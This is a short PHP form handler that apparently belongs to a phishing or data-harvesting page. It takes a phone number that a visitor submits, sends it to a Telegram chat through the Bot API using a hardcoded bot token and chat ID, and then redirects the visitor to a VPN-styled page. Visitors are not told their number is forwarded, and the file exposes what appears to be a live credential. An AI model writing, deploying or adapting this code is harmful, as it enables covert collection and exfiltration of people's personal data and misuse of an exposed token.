<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $phoneNumber = $_POST['phone'];

    $telegramBotToken = '6511169874:AAGOPB61vyiJs9ugVUjPCvBiyLKIfdN8mA8';

    $chatId = '6157045203';

    $message = "New phone number: " . $phoneNumber;

    $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    file_get_contents($url);
}
header('Location: vpn/index.html');
?>
